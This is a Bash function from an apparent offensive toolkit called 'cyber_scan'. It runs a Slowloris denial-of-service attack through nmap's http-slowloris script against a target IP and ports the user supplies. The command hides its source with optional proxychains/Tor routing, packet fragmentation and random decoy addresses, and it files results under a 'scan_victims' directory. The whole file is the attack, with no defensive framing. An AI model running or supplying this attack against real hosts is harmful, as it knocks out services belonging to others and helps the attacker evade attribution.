#! /bin/bash

source ./cyber_scan/lib/settings/services.sh
source ./cyber_scan/lib/scan/helpers/inputs.sh
source ./cyber_scan/validators/ipv4_validator.sh
source ./cyber_scan/lib/scan/helpers/create_dir.sh
source ./cyber_scan/lib/util/success_output.sh
source ./cyber_scan/assets/set_color.sh

function dos_attack()
{
	services "DOS attack"

        proxychains_input
        if [[ $proxychains == [Yy] ]]; then
                is_tor="proxychains"
        else
                is_tor=""
        fi

	dns_input
        ipv4_validator "$dns"
        if [ $? -ne 0 ]; then
                return 1
        fi

	ports_input

	debug_mode
	if [[ $debug == [Yy] ]]; then
		debug_flag="-d"
	else
		debug_flag=""
	fi

	dir_input
	create_dir "$dir_name/attacks/dos"


	$is_tor nmap -p"$ports" --script=http-slowloris-check,http-slowloris \
	 --max-parallelism=400 \
	 -f --send-eth -D RND:3 \
	 --script-args=http-slowloris.timelimit $debug_flag \
	 -oN "scan_victims/$dir_name/attacks/dos/$dns.nmap" "$dns"

	success_output "$dir_name" "attacks/dos" "$dns.nmap"
}
